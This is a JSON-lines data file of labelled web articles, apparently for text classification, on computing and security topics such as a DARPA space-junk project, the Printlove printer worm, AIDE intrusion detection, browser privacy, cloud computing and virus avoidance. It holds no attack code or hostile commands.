{"text": "DARPA looking for citizen sky-watchers\nWhy not find some space junk in your spare time?\nA reader has alerted The Register to a story that passed us by last week: the launch of a DARPA program recruiting amateur astronomers to help identify and catalogue space junk.\nLaunched here, the SpaceView project would add “citizen scientist” efforts to more expensive space junk searches like the Space Surveillance Network.\nThe number of known objects in the cloud of detritus surrounding the Earth is more than half a million and growing – every new launch adds to the problem, and collisions between objects are getting more common as they multiply.\nBy comparison, the Space Surveillance Network is only tracking around 30,000 bits of junk. Hence SpaceView: an attempt to expand the available resources without crippling cost.\nThe project is currently at the sign-on stage: DARPA wants to know about the “equipment, sites and observing habits” of astronomers interested in joining the program.\nThe program is looking for sites with equipment that could be upgraded to collect observations under remote control, which would act as a single distributed world-wide sensor. Where a site is selected for inclusion in SpaceView, DARPA will provide the equipment to turn it into an automated observatory.\nThe first dozen sites will be selected late in 2013. ®", "label": 1}
{"text": "Physically Secure Your Computer\nUnfortunately, computer thefts do occasionally happen at Whitman. Almost always it is a crime of opportunity — a laptop left alone and unsecured in the library, for example. It is your responsibility to ensure that your computer is secured against physical theft. The following advice can help you to that end.\nProtect the Computer Itself\nThe best way to protect yourself from computer theft is to make it as difficult as possible for someone to pick up your machine and run off with it.\n- If you have a desktop computer, you may wish to investigate padlocking the case shut to prevent theft of internal components.\n- If you have a laptop computer, you may wish to acquire a laptop locking cable: the computer equivalent of a bicycle lock.\n- At the very least, do not leave your laptop unprotected or unattended, in any open area, even for a few minutes, and always make sure you close and lock your room door when you leave.\nProtect Access to Your Computer's Data\nIf the worst should happen, and your computer does get stolen, the thief could gain access to all of your computer's secrets. It may not seem a big deal for a Bad Guy to see your homework assignments or music collection, but your computer could also contain some very valuable and important information about you. Passwords, financial data... even something as mundane as your Facebook credentials can have value to an attacker, and can easily be recovered from a stolen computer unless you take steps to protect your data.\n- Set a hard drive password.\n- If you laptop has a fingerprint scanner, consider using it to lock access to your computer's operating system.\n- Encrypt your home folder. OS X and (some versions of) Windows have built-in tools for doing this. More information may be found on our Encryption page.\n- Even better, encrypt your entire hard drive. For information on how to do this, see our Encryption page.", "label": 1}
{"text": "A computer worm that propagates by exploiting a 2010 Windows vulnerability is responsible for some of the recent incidents involving network printers suddenly printing useless data, according to security researchers from Symantec.\nMany companies have reported unauthorised printing incidents in recent weeks, prompting antivirus firms to investigate the possible causes.\nOn June 21, Symantec reported that the rogue printouts were the result of computers being infected with a Trojan program called Trojan.Milicenso.\nHowever, the company's researchers have since determined that the propagation routine of a separate piece of malware, a worm called W32.Printlove, can cause similar problems, Symantec researcher Jeet Morparia said earlier this week.\nW32.Printlove infects other computers on the local network by exploiting a remote code execution vulnerability in the Microsoft Windows Print Spooler service that was patched in September 2010. Identified as CVE-2010-2729, this vulnerability was also exploited by the Stuxnet industrial sabotage worm to spread.\nThe rogue printing behaviour can occur when W32.Printlove unsuccessfully attempts to infect a Windows XP computer connected to a shared network printer.\nThe worm starts by sending a print request to a targeted computer that is specifically crafted to exploit the CVE-2010-2729 vulnerability. If the exploitation attempt is successful, a copy of the malware is dropped in the Windows system directory and then executed.\nHowever, if the system is patched against CVE-2010-2729, a copy of the worm is created in the computer's printer spool directory - %SystemRoot%\\system32\\spool\\printers - as a randomly named .spl (Windows Printer Spool) file.\nThe computer interprets the creation of this file as a new print job and instructs the network printer to print the file's contents, therefore wasting paper and toner.\nBecause the worm periodically retries to infect a system, the rogue printing behaviour will be repeated until all network computers are cleaned, Morparia said. \"Tracking down the source of these junk print jobs can be more complicated when there are multiple infections on the network.\"\nFortunately, the failed infection attempts leave behind .shd files in the printer spool directory that contain details about printing jobs, including the names of computers that initiated them. Administrators can inspect SHD files with a free tool called SPLViewer after shutting down the Print Spooler service, Morparia said.\nThe W32.Printlove worm might be linked to the previously reported Trojan.Milicenso, Morparia said. \"We intend to continue our investigation to confirm any relationship between the two threats.\"", "label": 1}
{"text": "Over the past decade, the United States has witnessed remarkable advances in personal communications technology. Most of us now take for granted the ability to share all forms of information quickly, efficiently and cheaply. Our men and women in uniform have that same expectation.\nHowever, the modern warfare environment is complex and much different from what it was even 10 years ago. Additionally, preparing for current and future wartime environments is especially challenging in our fiscal climate.\nFiscal responsibility will mean extending the useful lives of proven systems, leveraging investments in commercial technologies, making current systems more effective through affordable upgrades and exploiting new operational concepts made possible by small technical enhancements.\nIn the case of the U.S. Army, it places more emphasis and responsibility on the squad. These squads need a substantial amount of flexibility and autonomy while staying connected to each other during the fight. U.S. forces need to collaborate and coordinate with unprecedented speed and accuracy. These well-trained fighting forces will need to make decisions on their own, and must have necessary information readily available. Networking is the uniquely powerful advantage for operations today and into the future.\nFor example, networking sensor systems — including radars among ships, aircraft and tethered aerostats — creates a more complete picture of the theater. Information from netted radars can be combined to see enemy missiles and aircraft earlier, and to detect threats that might be able to evade individual radars. When our aircraft battle adversaries are equipped with capable air defenses, networked jamming can be used to more effectively blind the enemy’s own radars.\nA commander in the field can rely on netted sensors to receive alerts detailing enemy fires and maneuvers. Even on the move, a commander can use mobile mission command systems to request intelligence, plan a counterstrike, direct networked weapon systems to execute it and call on surveillance systems to deliver the information needed to assess the results.\nThe technology empowers a single person or small unit to direct an action involving calls for intelligence, fires and surveillance. Shared, secure networks enable a convergence of intelligence and operations.\nHere’s another example of convergence: Vehicle-mounted night vision systems were developed originally to allow a gunner to see and engage targets at night and in degraded weather conditions. That mission expanded to the driver and commander. Once on the net, those cameras on the Army’s combat vehicles become sensor nodes. They become surveillance assets for the larger force, able to capture and deliver ground-level imagery to another unit that needs a different look at an area.\nWith networks that scale from the tactical edge to headquarters, that same video footage can be shared and become part of the theater intelligence database, where it can help analysts fill gaps in regional imagery. A similar story could be told about images or audio captured by an infantry soldier.\nThe dismounted soldier should be a major focus of investment in new networking technologies.\nRich intrasquad communications enhance the autonomy and effectiveness of small units by going way beyond voice communication. “Here’s what I think” becomes “here’s what I am seeing.”\nA mission plan or tactical situation can be marked up white-board style by forces collaborating in silence. This results in a leap ahead in situational awareness at all echelons.\nSoldiers’ communication tools need to have effective filters to identify which information matters. During a firefight, a data glut is just as bad as a data dearth. There isn’t time to sift through all the information.\nData that matters needs to be quickly and automatically flagged, integrated and shared. Small, high-definition cameras can now be easily and unobtrusively attached to weapons and armor. So intrasquad communication tools need to be able to carry full motion video. And data needs to be available immediately and without decay in its quality; even a few seconds of lag can mean the difference between a successful mission and one in which the enemy escapes or American lives are lost.\nDuring the push to upgrade military networking technologies, it’s still important to maintain fiscal responsibility. So the military and industry should collaborate and take advantage of existing systems that can be affordably upgraded, and make targeted investments in new tools that are compatible with these systems.\nImproving networking capabilities doesn’t require the military to break the bank, and equipping our forces with the networking tools they need will save lives and help them defeat our enemies.\nAndrew Zogg, vice president, Network Centric Systems, Business Development, Raytheon.", "label": 1}
{"text": "Front-line measures like firewalling, strong authentication, and staying on top of security updates are mandatory steps to keeping your system secure. But you also need to check your system's health frequently and make sure a compromise didn't slip past you unnoticed. A good place to start is with an intrusion detection system (IDS) that monitors your machine's resources and flags any changes that might indicate an intruder or a rootkit. The Advanced Intrusion Detection Environment (AIDE) is an open source IDS that you can set up in a weekend.\nBefore we get started, though, it's vital to understand how an IDS like AIDE functions. AIDE is a host-based IDS, which basically means that it scans the filesystem and logs the attributes of important files, directories, and devices. Each time it runs, it compares its findings against the previous, \"known good\" data, and alerts you if something has changes. But the downside is that if your system is already compromised before you install and run AIDE initially, you won't be able to detect it.\nOf course, the odds that your system is already compromised aren't high, but the fact remains that the only way to guarantee that it is clean is to install and run AIDE right after you install the OS, but before you connect to the network. Put that on your to-do list when deploying new machines from now on, and as for your existing Linux boxes, make do as best as you can.\nAIDE runs on Linux and most other Unix-like operating systems. It is provided by most of the distributions, but you may want to consider grabbing the code from the project's Web site and compiling from source — there are a few advanced options that are only available at compile-time via the ./configure script. If you've already installed an AIDE binary, run\naide -v, which will dump out the version number and the compile-time options used. For now, though, we'll talk about the basic installation and usage.\nSetup and First-Run\nAIDE works its magic by reading in a configuration file that contains both a list of directories and files to scan, and the attributes of each entry to log. It then works its way through the tree of nodes to be scanned, and writes out a database of the attributes found. There are currently thirteen attributes that AIDE can log — including permissions, owner, group, size, all three timestamps (atime, ctime, and mtime), plus lower-level stuff like inode, block count, number of links, and so on.\nOn top of those, AIDE supports multiple has algorithms with which it can generate checksums for each file. By default, the list includes MD5, SHA-1, SHA-256, SHA-512, RMD-160, Tiger, HAVAL, and CRC-32. If you compile AIDE with the mhash option to the configuration script, you can also use GOST and Whirlpool hashes.\nBinary packages probably include a decent example configuration file in\n/etc/aide/aide.conf — in a bit, we'll explain why you might want to use a different location, but for the moment, open the file in an editor, and take a look at the configuration directives.\nNear the top are rule definitions, which are just user-supplied names followed by an equal sign and a list of attributes and hashes. For example:\nSizeOnly = s+b SizeAndChecksum = s+b+md5+sha1 ReallyParanoid = p+i+n+u+g+s+b+m+a+c+md5+sha1+rmd160+tiger+whirlpool\nThe first line activates just the size (s) and block count (b) attributes. The second adds MD5 and SHA-1 hashes, and the third logs just about every supported feature, including inode (i), timestamps (m, a, and c) and a fistful of additional hashes.\nBelow these rule definitions you'll find a lines listing the directories and files to check, using regular-expression based formulas. For example:\n/etc SizeAndChecksum /sbin ReallyParanoid /var Size !/var/log/.* !/var/spool/.*\nThe first three lines are \"positive\" expressions, which tell AIDE to include everything that matches the regular expression. The leading exclamation point on the last two indicate a \"negative\" expression, which in this case says to exclude the rapidly-changing\n/var/spool/ directories. As you can see, each positive expression is followed by the name of one of the rule definitions. You could also use a literal string instead of a rule name here, such as\n/var/www/intranet p+s+b+a+sha256 — the rule names are just for easier reading.\nCorrectly defining your regular expressions and rules is the trickiest part of using AIDE. Too many files and directories, and you can end up with extremely long logs to read through on every integrity check. Too narrow of a set, and you risk missing an intruder. It's also not trivially easy to get the right balance of regular expression syntax when you want to match some files in a directory hierarchy, but not others. It's a good idea to consult the AIDE user manual and read\nman aide.conf for help combining wildcards with positive and negative expressions.\nOf course, there's no substitute for actually trying out your configuration with a real run. Run\nsudo aide --init, and AIDE scans the designated files and directories, writing its findings to a database. The location of the database is determined by a line of the form\ndatabase=URL in the configuration file. The data is also copied to stdout, so you can watch the process from a terminal window. If you're missing some files and need to tweak your expressions, you can do so and re-run the process before proceeding.\nComparing Subsequent Checks\nNow comes the important (and potentially confusing) part. Time goes by, and whenever you feel it's prudent, you decide to run another scan with\nsudo aide --check. Except that unless you specify otherwise, AIDE looks for a configuration file in the current working directory — which raises the question of where you should keep that all-important configuration file.\nAt first glance, it might seem like you should store it in a standard location like\n/etc/aide/, but that's actually a bad idea, because if your system ever was cracked, intruders could not only read your AIDE configuration and look for directories that you've elected to ignore, but they could alter the URL of the output database in order to trick subsequent AIDE scans.\nSo the best plan is, in fact, to store the aide.conf file on removable media (preferably read-only), that you mount just before running a scan. For similar reasons, the safest place to store AIDE's output database is also on this removable media, so inside the configuration file the database line might be\ndatabase=/media/AIDE_CD_012345/aide.db. You tell AIDE where the configuration file is with the --config command-line parameter.\nThus, the correct scan command to run is (in this example)\nsudo aide --check --config=/media/AIDE_CD_012345/aide.conf.\nIf someone replaces your copy of /sbin/fsck, the second scan should notice it and report it to you on stdout. On the other hand, you may have good reason to alter a system file like /etc/pam.conf yourself, in which case you don't need AIDE throwing a red flag every time you run a scan. You can invoke AIDE as\nsudo aide --update --config=/path/to/your/aide.conf to both run a scan and output an updated copy of the database. AIDE will save the new database at the URL you specify in the configuration file after\ndatabase_out=. If you're following proper protocol, this will be someplace mounted read-write, and you will subsequently copy the new database to your read-only media.\nSo how often should you run scans? It depends on the machine. On the plug-computer that runs your house's lighting control and sprinkler system, rarely. On the company's Internet gateway, daily at least.\nExtra Credit: ACLs, SELinux, and Database Signing\nAs you've probably realized, all AIDE can do is alert you to changed files. The ball is in your court to recognize whether the change is a sign of a security breach. Some system files should never change; some (such as tty devices) change owner and permissions during regular operation. You have to get to know your system.\nDepending on your system, you may not find the generic AIDE binaries supplied by your distribution up to the task. That is because there are a few attributes that AIDE can monitor only if they are configured as compile-time options, such as support for SELinux's security contexts, access control lists, and extended file attributes. If you need any of those features, you'll want to compile AIDE yourself from source. Luckily it's not hard; the standard GNU compiler chain is all that is required.\nAs mentioned above, the compile-time options also include support for additional hash algorithms. Which you prefer is largely a matter of personal mathematical preference. But there is also one other compile-time option that you should consider if you want a really secure setup. Configuring AIDE with HMAC (hash-based message authentication code) support allows you to cryptographically sign both the configuration file and the output database.\nThis is a compile-time option, not a run-time option, because adding it in prevents the\naide binary from running a scan in the event that the signature of the config file or database doesn't match. That's what you want: a binary that cannot be tricked into using a compromised database. Because let's face it — the read-only media you're using is only as secure as the locker you store it in. To configure AIDE with HMAC support, read the final section of the AIDE online manual. You'll need to pick a pair of encryption keys, but otherwise it's a fairly simple process. After that, it's sit back and scan-as-usual.", "label": 1}
{"text": "Many a time users forget that browsers are in fact just programs like a game or a photo editor, with the ability to connect us any local network or the World Wide Web. Simply because we may be visiting a secure site, or are browsing a secure location does not mean that we are automatically safe from the many threats there are online, as our browsers as well can fall prey to hackers and the like. In fact it is this misunderstanding which has led internet browsers to become one of the most popular routes through which users can be targeted.\nCookies are another interesting thing that you should be aware of. The cookies which are stored on your hard drive are in fact little packets of data that were sent from a specific website and contain information related to that website, the purpose is, that the next time your decide to visit the same web page the information from that page is already present on your computer and hence loading up the site is done much more rapidly. Cookies themselves are designed to hold information related to that website, however, people out there looking to do you harm can manipulate the cookie to store more than just information of that site itself. For example cookies that can track your online behavior and patterns. Another way that cookies can be rather dangerous is through an approach called packet sniffing, as the cookies are packets of data, hackers and others trying to steal information don’t have to hack your computer, rather they can intercept and sniff the information sent out from your computer in the little packets we call cookies, with software such as Firesheep. By making sure that you are running and storing safe cookies you can help protect yourself from packet sniffing and other such problems.\nAnother thing that can compromise your security is running an out of date browser version. The reason why browsers have newer versions is simply because there are always errors and bugs that the developers are always trying to uproot and correct, the newer version of your browser contains many security updates which will protect you from newer viruses, viruses which your old version can be infected with. Another good addition to an updated browser version is using an anti-virus which also scans your browser and protects you from online threats. This combination should provide you with a very good safety measure; however anti-spyware software to run with your browser is also not a bad addition. And all three working for you simultaneously should have you covered from most places that you may visit online.\nThe other routes through which your computer can be compromised are the plug-ins that run on your browser for example the flash player which is used to play videos. These are things that are built in to your browser and the best solution is to use only those which are necessary.\nImage Courtesy: wktconnection", "label": 1}
{"text": "Who's Tracking When You're Browsing?\nOnline privacy was in the headlines recently when news broke that Google bypassed privacy settings in Apple's Safari browser and Microsoft's Internet Explorer browser to install cookies to track activity. The stories stirred up concerns among users about what information is being collected about them.\nLet's first review what a cookie is and what it does. Cookies are small files that websites can place on a hard drive to do things like identify returning visitors, personalize content displayed, and store items in shopping carts. They are also used for data collection to determine usage statistics.\nJumping Through a Loophole in Safari\nResearchers discovered that Google bypassed the privacy settings in Safari by exploiting a loophole. It involved tricking the Safari browser into allowing it to install cookies to serve ads with a tie-in to its Google Plus social network — adding a +1 button to ads for users to click if they approved of them. Because of another quirk in Safari, this opened the door for additional Google cookies to be installed, potentially allowing wider tracking.\nGoogle's response was that it used known Safari functionality to provide features for people who were signed into Google services. Enabling the installation of additional cookies was unintentional, it said, so the company started removing these cookies from Safari browsers. Google also noted that the cookies do not collect personal information.\nExploring What Happened With Internet Explorer\nShortly after the Safari loophole was announced, Microsoft discovered that the privacy preferences of Internet Explorer's users were also being circumvented by Google. Microsoft said Google was getting around a privacy safeguard in its Internet Explorer 9 browser that helps users prevent advertisers from placing cookies on their computers.\nHere's how it happened: IE9 blocks sites from installing cookies for other sites so Google.com shouldn't be able to install a cookie for its advertising arm, DoubleClick.com. The exception is that IE9 does allow sites to install third-party cookies if they flash a kind of \"digital ID card\" called P3P (Platform for Privacy Preferences). P3P relies on sites like Google to volunteer a description of themselves, including what will be done with data gleaned from tracking users. Any site that refuses to describe itself to Microsoft's browser gets a tracking cookie anyway. In other words, the system only blocks sites that explicitly identify themselves as advertisers. Those that don't identify themselves at all can slip through.\nTake Action to Guard Your Privacy\nWhat steps can you take if you're concerned about browser tracking? Web browsers have settings that allow you to manage at least some tracking activity by setting your cookie preferences, and you can also choose to delete certain cookies. Simply follow the tutorials included here.", "label": 1}
{"text": "Cloud Computing: CNBC Explains\nSenior Editor, CNBC\nTo hear the experts tell it, cloud computing may be the most innovative technology development in decades, or should be dismissed as a marketing tool for existing know-how that's as old as computers themselves.\nWe can't settle the debate on the uniquene\nss of cloud computing, but there are some issues that can be resolved without controversy: just what is cloud computing, who uses it, and what are the benefits and risks?\nWhat is Cloud Computing?\nThe official definition from the National Institute of Standards and Technology reads: \"Cloud computing is a model for enabling convenient, on-demand network access to a shared pool of configurable computing resources (e.g., networks, servers, storage, applications and services)that can be rapidly provisioned and released with minimal management effort or service provider interaction.\"\nTranslation? Accessing the Internet anywhere, anytime and being able to use any or all of the data and applications that you want.\n\"Consumers don't completely understand it yet and there's been a lot of hype, but it's having your data or software stored somewhere besides your PC or Mac and being able to get it through the Internet,\" explains Chris Geiser, CTO of The Garrigan Lyman Group, a digital marketing and advertising agency.\nWhen the technical jargon is stripped away, cloud computing can be grasped on its basic level— anytime, anywhere computing—without the user ever having to know much about the technology.\nHow Does It Work?\nIn simplest terms, cloud computing involves delivering hosted services over the Internet. The service end is where the data or software is stored and the user end is a single person or company network.\n\"Cloud computing minimizes the hardware, like memory, and application requirements, like word processing, for the users and pools those resources in the 'cloud,\" says Danny McPerson, CSO of Verisign .\nSo, a company in the business of hosting has specified data stored on its servers, a user fires up their computer, connects to the web (and to the servers holding their data), clicks on their application software and away they go.\nWhat gets somewhat mind-numbing are the kinds of storage systems services used in cloud computing. There are three basic 'alphabet soup' levels of storage capabilities, but there's no real need to go into those here. Any or all three can be offered by the same provider—for a price.\nAnd there are so-called public, private or hybrid clouds; public meaning the data is accessible to anyone, private being subject to a company's firewall or security system, and hybrid, which combines both public and private.\nBut it's fairly safe to say that most users are more than likely to be content knowing their data is stored somewhere other than their computer and they have access to it whenever and whereever they go online.\nWho Uses Cloud Computing?\nYou are probably using it right now. If you use email, or go to a social network and post photos, access online document software, or use your company's hardware/software, you're probably using the cloud. You may also use it to store online tax or financial records. You can also use cloud computing to back up files for storage off your PC or Mac.\nBusinesses such as hotels use it for consumers to make reservations and a major electronics retailer is using it to fill their online orders. Sending a picture to a Facebook friend today? You are headed for the clouds.\nWhere Did Term Cloud Computing Come From?\nThe concept of cloud computing dates back to the 1960's. The phrase originates from the cloud symbol used by flow charts and diagrams to symbolize the Internet. The diagram to the left underscores the idea that any computer connected to the web has access to a pool of computing power, applications and files.\nThe first reported public use of the term came in August of 2006 at a search engine conference in San Jose, Calif. when then Google CEO Eric Schmidt described one approach to data storage as \"cloud computing.\"\nBut in a sign of the ever-competitive Internet wars, research shows that Schmidt may have been trying to pre-empt Amazon,which was about to release its Elastic Compute Cloud system later that month.\nWho Provides Cloud Computing Services?\nDozens of firms are providing 'clouds' in the U.S. and other countries. They generally fall into three categories of service: software, storage and computing power, or platform providers that give site developers tools to build and host applications. Some do all three. Big or small, all see this as a natural way to make money in a very competitive field.\nSome names might be surprising as they may be better known as content providers or consumer sites. Here are just a few of the major players:\nAmazon: considered one of the innovators in cloud computing since it began offering services in 2006. Amazon has thousands of small business and individual users along with customers like the New York Times and Eli Lilly .\nGoogle: in what might have been a strike again Microsoft , the internet search giant launched Google Apps in 2007. Customers include small businesses and colleges like Northwestern University.\nMicrosoft: the tech giant has made its windows operating system available with cloud computing through the Azure program. Microsoft also offers various business services. Customers using the program include Epicor and Micro Focus.\nNetSuite: founded by Oracle CEO Larry Ellison, NetSuite offers web based applications for small businesses including Wolfgang Puck Coffee.\nSalesforce.com: started in 1999, Salesforce is considered a pioneer in cloud computing, with its software as a service product. Customers include financial services, media and health firms as well as retail companies.\nGoGrid: the Canadian based firm is a division of ServePath. It's said to be one of Amazon's chief competitors in cloud storage. Customers are mostly start-up firms and a few bigger companies like Novell.", "label": 1}
{"text": "Gauss malware, Apple iPhone show what encryption can do\nSome of the most sound advice for securing sensitive information, whether it be in an e-mail, on a mobile device or at rest in a database, involves encryption. Simply put, encryption can keep data safe, for good or ill, as a couple recent examples illustrate.\nAfter researchers at Kaspersky Labs come across Gauss, the latest in the Stuxnet/Duqu/Flame state-sponsored malware chain, and started examining it, they ran into a problem. The malware contained an encrypted “warhead” that the researchers couldn’t crack.\nGauss has a module called “Godel” (many of the malware’s components are named after famous mathematicians) with a payload of unknown purpose. “Despite our best efforts, we were unable to break the encryption,” researchers said in a blog post.\nStuxnet/Flame/Gauss and the limits of cyber espionage\nMobile security guide catches up with smart phones, BYOD\nSo Kaspersky offered up all of its information on Gauss and asked “anyone interested in cryptology and mathematics to join us in solving the mystery and extracting the hidden payload.” A long list of people have contributed ideas, but as of this writing the warhead remains a mystery.\nGauss was discovered infiltrating systems in the Middle East, primarily in Lebanon, and is believed to be part of a U.S.-led cyber warfare program that includes Stuxnet and Flame, both of which were found mostly attacking systems in Iran. U.S. officials likely are hoping Gauss’ encryption holds up.\nThe investigation into Gauss might illustrate how cyberspace differs from traditional battlegrounds. During, say, the Cold War, if scientists found an unfamiliar warhead they probably wouldn’t make a public project out of taking it apart and seeing what’s inside. But the Gauss investigation also shows the power of encryption -- be it in malware, in industrial systems in computers or even phones.\nAgencies should take note of how encryption protects data, particularly as they try to manage security for mobile devices that can be lost or stolen.\nLaw enforcement officials worry that good encryption could hurt their chances of retrieving forensic evidence against suspected criminals, but that same protection could also be applied to devices being carried by government employees.\nApple, for example, has improved the security on the iPhone to the point that it could leave law enforcement at a disadvantage against criminals who carry them, Simson L. Garfinkel writes in Technology Review.\nThe most significant of Apple’s security steps for the iPhone is the addition of the Advanced Encryption Standard, a U.S. government standard since 2001 and considered to be unbreakable, Garfinkel writes. And the iPhone’s tightly knitted architecture makes it easy for users to apply the encryption. And of course, encryption tools are available for Android and other mobile devices.\n\"I can tell you from the Department of Justice perspective, if that drive is encrypted, you're done,” Ovie Carroll, director of the cyber-crime lab at the Justice Department’s Computer Crime and Intellectual Property Section, said at a recent conference, Garfinkel reports. “When conducting criminal investigations, if you pull the power on a drive that is whole-disk encrypted, you have lost any chance of recovering that data.\"\nLaw-abiding users, however, can let law enforcement officials and the courts worry about criminals’ phones. Instead, agencies deploying smart phones and tablets or allowing them as part of BYOD programs could take note of how well a good encryption program works.", "label": 1}
{"text": "WASHINGTON — Kids have easy and inexpensive access to hundreds of smartphone applications, but parents are in the dark about what personal information is being collected from their children and how companies are using the data, government regulators said Thursday.\nThe Federal Trade Commission said companies that make mobile apps, and the stores that sell them, should be providing parents with basic, simple-to-understand information about their products so they can choose which apps their children can use. The report also says developers should disclose whether their apps connect with social media services or include advertisements.\nMobile apps can automatically capture smartphone information, such as a person’s location, phone number, call logs and personal contacts.\nThe market for mobile apps has exploded over the past few years, according to the FTC. In 2008, there were about 600 apps available to smartphone users. Now there are hundreds of thousands that have been downloaded more than 28 billion times, the commission said.\n“This rapidly growing market provides enormous opportunities and benefits for app users of all ages, but raises questions about users’ privacy, especially when the users are children and teens,” the report by the FTC staff said.\nUsing the word “kids,” FTC staff searched online app stores and examined pages promoting apps for word games, math and number games, and entertainment. Most of the product descriptions stated that they were for use by children. Prices for the apps ranged from free to $9.99. “But most apps were $0.99 or less, and free apps were overwhelmingly the most frequently downloaded,” the report said.", "label": 1}
{"text": "ARCHIVED: Avoiding computer viruses\nComputer viruses implant instructions in other programs or storage devices and can attack, scramble, or erase computer data. The danger of computer viruses lies in their ability to replicate themselves and spread from system to system. Few computing systems are immune to infection.\nOn this page:\nThe following activities are among the most common ways of getting computer viruses. Minimizing the frequency of these activities will reduce your risk of getting a computer virus:\n- Freely sharing computer programs and system disks, or downloading\nfiles and software through file-sharing applications such as\nBitTorrent, eDonkey, and KaZaA\n- Clicking links in instant messaging (IM) that have no\ncontext or have only general text; for more information, see What should I do if my computer is infected with an instant messaging (IM) Trojan?\n- Downloading executable software from public-access bulletin boards\nor web sites\n- Using your personal disk space with public computers or other\ncomputers that are used by more than one person\n- Opening email attachments from people you don't know or without\nfirst scanning them for viruses; for more information, see ARCHIVED: Using Symantec/Norton AntiVirus Corporate Edition, how do I immediately scan a file, folder, or drive for viruses? and ARCHIVED: Using Norton AntiVirus for Mac OS or Mac OS X, how do I immediately scan a file, folder, or drive for viruses?\n- Opening any email attachment that ends in\n.lnkon a computer running Microsoft Windows (At Indiana University, UITS blocks certain attachments that commonly harbor viruses from being delivered via email; for more information, see At IU, what types of attachments are blocked from my email account?)\n- Continually running your Windows computer as an administrator; for more information, see ARCHIVED: In Windows, why should I avoid running my computer as an administrator?\nHow to avoid computer viruses\nFollowing are some recommendations for safe computing:\n- The most important thing you can do to keep your computer safe is\nto install virus detection software and keep the virus patterns up to\ndate. Antivirus programs perform two general functions: scanning for\nand removing viruses in files on disks, and monitoring the operation\nof your computer for virus-like activity (either known actions of\nspecific viruses or general suspicious activity). Most antivirus\npackages contain routines that can perform each kind of task.\nNote: The University Information Security Office (UISO) recommends that you run the latest version of Symantec virus protection software (available to IU students, faculty, and staff free of charge via IUware) for your operating system; See In Windows, how do I safely upgrade to the latest Symantec Endpoint or AntiVirus software? Be sure to upgrade safely, update your virus definitions daily, and scan your computer weekly. Check the software help for instructions.\n- Keep your operating system current with the latest\npatches and updates. The writers of viruses and\nworms often exploit bugs and security holes in operating\nsystems and other computer software. Software manufacturers frequently\nrelease patches for such holes. For information on obtaining the\nlatest patches, see ARCHIVED: For Windows, how can I get software updates and patches? and ARCHIVED: For Mac OS X, how do I obtain and install system software updates?\n- Back up your files. Viruses are one more very good reason to\nalways back up your files.\nNote: If you back up a file that is already infected with a virus, you can re-infect your system by restoring files from the backup copies. Check your backup files with virus scanning software before using them.\n- Keep your original application and system disks locked\n(write-protected). This will prevent the virus from spreading to your\n- If you must insert one of your application disks into an unknown\ncomputer, lock (write-protect) it first, and unlock your application\ndisk only after verifying that the machine is virus-free.\n- Obtain public-domain software from reputable sources. Check newly\ndownloaded software thoroughly using reputable virus detection\nsoftware on a locked floppy disk for any signs of infection before you\ncopy it to a hard disk. This can also help protect you from\nTrojan horse programs.\n- Quarantine infected systems. If you discover that a system is\ninfected with a virus, immediately isolate it from other systems. In\nother words, disconnect it from any network it is on and don't allow\nanyone to move files from it to another system. Once the system has\nbeen disinfected, you can copy or move files.\n- If you use a desktop version of Outlook, minimize use of the preview or reading pane feature.\nLast modified on August 30, 2010.", "label": 1}
{"text": "In the vast universe of IT, data is categorized as being either structured or unstructured, from a macro perspective. Generation of unstructured data is orders of magnitude higher than that generated in structured formats, and this poses major challenges in terms of storage and processing and analytics. Such large amounts of data collectively form what is known as big data, the handling of which is usually beyond the capability of traditional relational database management systems (RDBMS).\nAs RDBMS has been the preferred method for storing, warehousing, and analyzing structured data, the industry has matured in the analysis of mainly structured data. Ignoring unstructured data is inadvisable, as effective analytics is today a key business differentiator. Organizations are exploring all possible sources of data to develop intelligent big data analytics systems that can provide deeper insights for informed decision making.\nTechnologies such as Hadoop and specialized non-relational databases such as columnar databases, graph databases and document databases are being widely implemented to store and process unstructured big data for analytics. MapReduce is the distributed data processing and querying engine to extract data from big datasets hosted on compute clusters in any typical Hadoop implementation. Structured Query Language (SQL) has been the de-facto standard for querying data out of RDBMS systems.\nRDBMS systems are generally known to hold data spanning terabytes in any typical warehousing environments. But when systems hosting unstructured data come into picture, the size of the data would scale to a minimum of hundreds of petabytes, thus qualifying as big data. Currently, systems with structured and unstructured data are operated in mutually exclusive mode without any interoperability. Organizations need to explore and exploit the intelligence hidden in unstructured big data, with suitable big data analytics. Nevertheless, dependence on RDBMS for existing lines of business applications would continue. The challenge is to implement a big data analytics solution that can analyze structured as well as unstructured big data using a common interface.\nIntegrated heterogeneous data processing using SQL and MapReduce in parallel\nIn a consolidated view of big organizational data, the weightage of relational data is no more than a modest-sized source system, when compared with unstructured data. In the context of this growing need, vendors are enhancing MapReduce data processing engines that can provide operating interface extensions to access structured data from relational databases using SQL. RDBMS vendors are rolling out drivers for interoperability with Hadoop environments to bridge the connectivity between MapReduce and SQL.\nDue to conscious interoperability efforts made by MapReduce/Hadoop\nvendors, as well as RDBMS vendors, big data analytics over heterogeneous data is becoming a\nreality. Greenplum MapReduce is one example of the potential of big data analytics. A data flow engine driven by Greenplum’s MapReduce can\nquery big sets of unstructured data (petabyte-scale) using parallel computing as well as query\nstructured data from relational databases using JDBC / ODBC drivers. Technically, thus, all\nrelational databases that support JDBC / ODBC can be queried using this parallel data flow\nApplications of analytics over big heterogeneous data\nAs the nature of data in structured and unstructured formats is different, the kind of analysis that can be done over this data is also different. With integrated big data analytics capable of sourcing data from any big data sources, applications can extract the deepest level of intelligence from the entire organizational data.\nFor example, consider a manufacturing unit in the FMCG segment. In the regular course of business operations, it would have big data generated from procurement of commodities; product manufacturing; brand promotion and product marketing; direct and indirect sales; customer care; sales support centers, and so on. Suppose that this company is publicly listed. Sales, procurements, stock inventory, incidents, and service requests would all be in structured data formats. Quotation negotiations, detailed readings from manufacturing instruments, online logs of user clickstreams on product advertisements, users’ feedback requests, and grievances recorded with support centers, daily stock feeds from stock exchanges, would all be stored in unstructured formats. All this amounts to big data and requires big data analytics techniques.\nPattern recognition and gap analysis are the immediate value additions that big data analytics can extract from heterogeneous data. With all these data sources analyzable using a single big data analytics solution, complex data analytics is now possible. For instance, one can analyze how a particular resource has a cascading impact on manufacturing performance, sales performance, customer reactions, CRM costs, and finally fluctuation in stock value. This pattern recognition using time series analysis can help identify gaps in processes. Also, direct and indirect association and impact of various key parameters of different business operations can be analyzed when all the data sources that form the organizational data are analyzable with big data analytics. SQL and MapReduce are likely to become the preferred querying mechanism for such big data analytics.\nAbout the Author: Siddharth Mehta works as an associate manager and a technical architect for BI software projects at Accenture Services. He is a recipient of Microsoft’s 